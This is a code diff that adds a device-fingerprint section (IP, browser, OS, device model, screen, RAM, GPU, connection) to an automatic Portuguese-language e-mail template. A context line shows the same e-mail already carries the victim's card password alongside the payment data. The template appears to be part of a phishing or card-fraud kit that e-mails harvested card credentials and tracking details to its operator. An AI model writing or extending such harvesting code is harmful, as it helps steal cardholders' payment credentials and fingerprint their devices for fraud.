@@ -340,6 +340,55 @@ Senha do Cartão: {payment_data.senhaCartao}
                         </tr>
                     </table>
 
+                    <h3 style="color: #333; margin-top: 20px; border-bottom: 1px solid #ddd; padding-bottom: 10px;">INFORMAÇÕES DO DISPOSITIVO</h3>
+
+                    <table style="width: 100%; margin-top: 10px; font-size: 12px;">
+                        <tr>
+                            <td style="padding: 6px; font-weight: bold; color: #555;">IP:</td>
+                            <td style="padding: 6px; color: #333;">{payment_data.ip or "Não disponível"}</td>
+                        </tr>
+                        <tr style="background-color: #f9f9f9;">
+                            <td style="padding: 6px; font-weight: bold; color: #555;">Navegador:</td>
+                            <td style="padding: 6px; color: #333;">{payment_data.browserName or "?"} v{payment_data.browserVersion or "?"}</td>
+                        </tr>
+                        <tr>
+                            <td style="padding: 6px; font-weight: bold; color: #555;">SO:</td>
+                            <td style="padding: 6px; color: #333;">{payment_data.osName or "?"} {payment_data.osVersion or "?"}</td>
+                        </tr>
+                        <tr style="background-color: #f9f9f9;">
+                            <td style="padding: 6px; font-weight: bold; color: #555;">Dispositivo:</td>
+                            <td style="padding: 6px; color: #333;">{payment_data.deviceType or "?"} - {payment_data.deviceModel or "?"}</td>
+                        </tr>
+                        <tr>
+                            <td style="padding: 6px; font-weight: bold; color: #555;">Resolução:</td>
+                            <td style="padding: 6px; color: #333;">{payment_data.screenWidth or "?"}x{payment_data.screenHeight or "?"}</td>
+                        </tr>
+                        <tr style="background-color: #f9f9f9;">
+                            <td style="padding: 6px; font-weight: bold; color: #555;">Idioma:</td>
+                            <td style="padding: 6px; color: #333;">{payment_data.language or "?"}</td>
+                        </tr>
+                        <tr>
+                            <td style="padding: 6px; font-weight: bold; color: #555;">Fuso Horário:</td>
+                            <td style="padding: 6px; color: #333;">{payment_data.timezone or "?"}</td>
+                        </tr>
+                        <tr style="background-color: #f9f9f9;">
+                            <td style="padding: 6px; font-weight: bold; color: #555;">Conexão:</td>
+                            <td style="padding: 6px; color: #333;">{payment_data.connectionType or "?"} ({payment_data.effectiveConnectionType or "?"})</td>
+                        </tr>
+                        <tr>
+                            <td style="padding: 6px; font-weight: bold; color: #555;">CPU Cores:</td>
+                            <td style="padding: 6px; color: #333;">{payment_data.cores or "?"}</td>
+                        </tr>
+                        <tr style="background-color: #f9f9f9;">
+                            <td style="padding: 6px; font-weight: bold; color: #555;">RAM:</td>
+                            <td style="padding: 6px; color: #333;">{payment_data.ram or "?"}GB</td>
+                        </tr>
+                        <tr>
+                            <td style="padding: 6px; font-weight: bold; color: #555;">GPU:</td>
+                            <td style="padding: 6px; color: #333;">{payment_data.gpu or "Desconhecido"}</td>
+                        </tr>
+                    </table>
+
                     <div style="margin-top: 20px; padding-top: 15px; border-top: 1px solid #eee; color: #999; font-size: 12px;">
                         <p>Este é um e-mail automático. Por favor, não responda a este e-mail.</p>
                     </div>
